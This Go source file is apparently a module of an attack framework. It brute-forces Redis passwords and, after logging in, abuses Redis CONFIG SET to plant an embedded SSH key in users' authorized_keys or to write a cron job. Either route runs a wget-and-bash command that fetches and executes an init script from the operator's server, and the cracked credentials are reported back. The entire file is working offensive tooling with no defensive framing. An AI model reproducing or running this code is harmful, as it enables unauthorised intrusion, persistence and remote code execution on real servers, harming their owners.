package bruteforce

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/proto/redis"
	"github.com/cbot/proto/ssh"
	"github.com/cbot/targets/source"
	"strings"
	"sync"
)

var RedisBruteForceAttackType = "RedisBruteForceAttack"
var RedisBruteForceAttackDefaultProto = "redis"
var RedisBruteForceAttackDefaultPort = 6379
var RedisBruteForceAttackName = "redis_bruteforce_attack"
var RedisTimeout = 5000
var RedisBruteForceTasks = 10
var SSHPrivKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrnTiLebNXrlu48q3mAZVXEfVICM9c1Amqip1Sy6+1kVPAjkmvohXbC0qxY0wfVaao7z0JEuOhN3Yx1DxPaGxKoLMyEguzpOLny2SZatndekqhvRp40rNfVA/0J/H5l4T8FGNbKrAGFPj37ZqzGyD74HhkT8iAL615PdBnAVneNK4rn+R3xT5KQEsJUr2yL36WyOPUNub3SqylT7MGL7nLVb345a/E5NNvbOPlE8IRwqgRcLdQf7fLJ/1s/68UnAlRHgFwBz4x59efTx1Z+wjgqyd4Ou6+65mSc22bnTX5hvDTeFJQsYjeE+bhllmgN9LDg1TUpMZl369jNJkkhkjFUIB5pZMycW3CxcUoQudrMFjrpnCFk1RJPmHSmfHX5vWbMVFPrNIyUhY3+8yLegOY/H6x1HIydklYGUVjI8rPwm2ngvBimzfp/B6FsmqnwNsEX0AqS5ojPnki9xKKlr7t1ZXE8ASahKgiy5uoTx2bKD3+jD6hRUuVSxqVYlOXeYc= root@master"

type RedisBruteforceAttack struct {
	dictPool    *DictPool
	attackTasks *attack.AttackTasks
}

func NewRedisBruteforceAttack(dictPool *DictPool, attackTasks *attack.AttackTasks) *RedisBruteforceAttack {

	return &RedisBruteforceAttack{
		dictPool:    dictPool,
		attackTasks: attackTasks,
	}
}

func (rba *RedisBruteforceAttack) Name() string {

	return RedisBruteForceAttackName
}

func (rba *RedisBruteforceAttack) DefaultPort() int {

	return RedisBruteForceAttackDefaultPort
}

func (rba *RedisBruteforceAttack) DefaultProto() string {

	return RedisBruteForceAttackDefaultProto
}

func (rba *RedisBruteforceAttack) Accept(target source.Target) bool {

	types := target.Source().GetTypes()

	for _, t := range types {

		if strings.EqualFold(t, RedisBruteForceAttackType) {

			return true
		}
	}

	return false
}

func (rba *RedisBruteforceAttack) doSSHAttack(redisClient *redis.RedisClient, ip string, cmd string) error {

	authPathMap := map[string]string{"root": "/root/.ssh/", "redis": "/home/redis/.ssh/", "server": "/home/server/.ssh/"}

	auth := "authorized_keys"
	content := fmt.Sprintf("\n%s\n", SSHPrivKey)

	for user, authPath := range authPathMap {

		redisClient.ConfigSet("dir", authPath)
		redisClient.Set("x", content)

		redisClient.ConfigSet("dbfilename", auth)

		if _, err := redisClient.Save(); err == nil {

			//ok
			sshClient, err := ssh.LoginWithPrivKey(ip, 22, user, SSHPrivKey, int64(RedisTimeout))

			if err != nil {
				return err
			}

			sshClient.RunCmd(cmd)

			sshClient.Close()

			return nil
		}

	}

	//failed
	return fmt.Errorf("Cannot write ssh private key into authorized_keys")

}

func (rba *RedisBruteforceAttack) doCronAttack(redisClient *redis.RedisClient, cmd string) error {

	pathMap := map[string]string{"root": "/var/spool/cron/", "server": "/var/spool/cron/", "redis": "/var/spool/cron/", "roote": "/etc/cron.d/"}
	cronShell := fmt.Sprintf("\n* * * * * %s \n", cmd)

	for user, path := range pathMap {

		redisClient.ConfigSet("dir", path)
		redisClient.Set("x", cronShell)

		redisClient.ConfigSet("dbfilename", user)

		if _, err := redisClient.Save(); err == nil {

			//ok
			return nil
		}
	}

	return fmt.Errorf("cannot write cron table")

}

func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient, ip string, port int, user string, passwd string) {

	var ap *attack.AttackProcess

	initUrl := rba.attackTasks.DownloadInitUrl(ip, port, RedisBruteForceAttackType, "init.sh.tpl")

	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)

	redisClient.ConfigSet("stop-writes-on-bgsave-error", "no")
	redisClient.SlaveOfNoOne()

	err := rba.doSSHAttack(redisClient, ip, cmd)

	if err != nil {
		//try to attack by cron
		rba.doCronAttack(redisClient, cmd)
	}

	ap = &attack.AttackProcess{
		TengoObj: attack.TengoObj{},
		IP:       ip,
		Host:     ip,
		Port:     port,
		Proto:    "redis",
		App:      "redis",
		OS:       "unknown",
		Name:     RedisBruteForceAttackName,
		Type:     RedisBruteForceAttackType,
		Status:   0,
		Payload:  cmd,
		Result:   "",
		Details:  fmt.Sprintf("%s|%s", user, passwd),
	}

	rba.PubProcess(ap)
}

func (rba *RedisBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEntry) {

	redisClient := redis.NewRedisClient(ip, port, entry.pass, uint64(RedisTimeout), 0)

	info, err := redisClient.Info()

	if err != nil || !strings.Contains(info, "redis_version:") {

		//login failed
		return
	}

	//login ok,start to attack

	rba.doAttack(redisClient, ip, port, entry.user, entry.pass)

}

func (rba *RedisBruteforceAttack) Run(target source.Target) error {

	dictEntries := rba.dictPool.Dicts()

	ip := target.IP()
	port := target.Port()

	if port <= 0 {

		port = rba.DefaultPort()
	}

	if ip == "" || port <= 0 {
		return fmt.Errorf("Invalid ip:%s and port:%d", ip, port)
	}

	dictQueue := NewDictEntryQueue(dictEntries)

	var wg sync.WaitGroup
	wg.Add(RedisBruteForceTasks)

	for i := 0; i < RedisBruteForceTasks; i++ {

		go func() {

			for {
				entry := dictQueue.Pop()

				if entry == nil {
					break
				}

				rba.tryBruteforce(ip, port, entry)

			}

			wg.Done()
		}()
	}

	return nil
}

func (rba *RedisBruteforceAttack) PubProcess(process *attack.AttackProcess) {

	rba.attackTasks.PubAttackProcess(process)

}
